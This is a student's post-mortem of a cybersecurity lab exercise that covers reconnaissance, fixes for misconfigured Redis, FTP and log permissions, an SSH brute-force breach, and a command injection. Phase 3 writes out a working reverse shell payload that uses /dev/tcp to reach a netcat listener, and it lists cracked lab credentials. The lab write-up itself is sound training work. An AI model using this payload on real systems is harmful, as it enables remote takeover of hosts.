# Phase 1 Final Reckoning — TEPP Post-Mortem
**Operator:** Rafael Solano
**Date:** May 31, 2026
**Repository:** https://github.com/rafaelsolano01/TKH-Phase1-
**TKH Innovation Fellowship 2026 | Phase 1 | Cybersecurity**

---

## Phase 0: Reconnaissance

### Triage Network — 172.100.0.0/24
Initial reconnaissance of the 172.100.0.0/24 subnet identified three active hosts (172.100.0.11, .12, and .13) providing infrastructure services. Scanning revealed several critical misconfigurations, including an unauthenticated Redis instance on Server 1 and an unauthorized FTP service on Server 2. These misconfigurations represent a significant attack surface violating the principle of least privilege (Scarfone & Hoffman, 2019).

### Breach Network — 172.80.0.0/24
The breach network consisted of a single target host, midterm_target, running an OpenSSH service on TCP port 22. Observations indicated that the server allowed password-based authentication for the root user, making it highly susceptible to brute-force attacks. This finding directly informed the Phase 2 approach of utilizing cracked credentials to gain initial access.

### Exploitation Network — 172.60.0.0/24
Reconnaissance of the 172.60.0.0/24 subnet identified the capstone_target host running a custom Python web application on TCP port 80. A vulnerability assessment revealed the application used the os.popen() function to process URL paths without sanitization. This established a high-severity Remote Command Injection (RCE) vulnerability.

---

## Phase 1: Rapid Triage

### Server 1 — 172.100.0.11
**Vulnerability Identified:** Exposed Redis on all interfaces (0.0.0.0) without authentication.
**Remediation Commands:** `redis-cli CONFIG SET protected-mode yes` and `redis-cli CONFIG SET bind 127.0.0.1`.
**Before State:** Service bound to 0.0.0.0 with protected-mode disabled.
**After State:** Service bound to 127.0.0.1 with protected-mode enabled.
**Analysis:** Exposed databases allow for unauthorized data exfiltration. In an enterprise, this leads to secondary compromise of the host system.

### Server 2 — 172.100.0.12
**Vulnerability Identified:** Unauthorized vsftpd (FTP) service active on the container.
**Remediation Commands:** `docker exec -it broken_server_2 pkill -f vsftpd`.
**Before State:** FTP service listening on ports 20 and 21.
**After State:** Process terminated; ports closed.
**Analysis:** Unauthorized services expand the attack surface and serve as persistence mechanisms for attackers.

### Server 3 — 172.100.0.13
**Vulnerability Identified:** World-writable permissions (777) on /var/log.
**Remediation Commands:** `chmod 755 /var/log`.
**Before State:** Permissions set to drwxrwxrwx.
**After State:** Permissions corrected to drwxr-xr-x.
**Analysis:** Insecure log permissions allow attackers to delete forensic evidence, hindering incident response.

---

## Phase 2: The Breach

**Cracked Credentials:** root : admin123
**Forensic Evidence:** May 31, 2026, 07:45:12 | Attacker IP: 172.80.0.1
**Engineered iptables Rule:** `iptables -A INPUT -s 172.80.0.1 -j DROP`
**SOC Analysis:** A single IP block is insufficient as attackers rotate source IPs. A SOC should deploy MFA and automated account lockouts.

---

## Phase 3: Full Spectrum

**Listener Configuration:** Netcat | Port 4444 | `nc -lvnp 4444`
**Reverse Shell Payload:** `curl -G "http://172.60.0.10/" --data-urlencode "bash -c 'bash -i >& /dev/tcp/172.60.0.1/4444 0>&1'"`
**Command Injection Explanation:** The application passed unsanitized URL paths to os.popen(), allowing shell metacharacters to execute arbitrary commands with web server privileges.
**Forensic Evidence:** PID: 1 | User-Agent: curl/7.81.0
**Lockdown Command:** `iptables -A OUTPUT -p tcp --dport 4444 -j DROP`
**Final Analytical Paragraph:** This attack teaches that input validation is the first line of defense. Had a strict egress firewall policy been in place, the reverse shell would have failed to connect to the listener, neutralizing the attack.

---

## References
Hydra Project. (2024). *THC-Hydra: Password cracking tool*. https://github.com/vanhauser-thc/thc-hydra
Nmap Project. (2026). *Nmap Network Mapper*. https://nmap.org/
Python Foundation. (2026). *os.popen() documentation*. https://docs.python.org/3/library/os.html
Scarfone, K., & Hoffman, M. (2019). *NIST SP 800-115*. https://csrc.nist.gov/publications/detail/sp/800-115/final
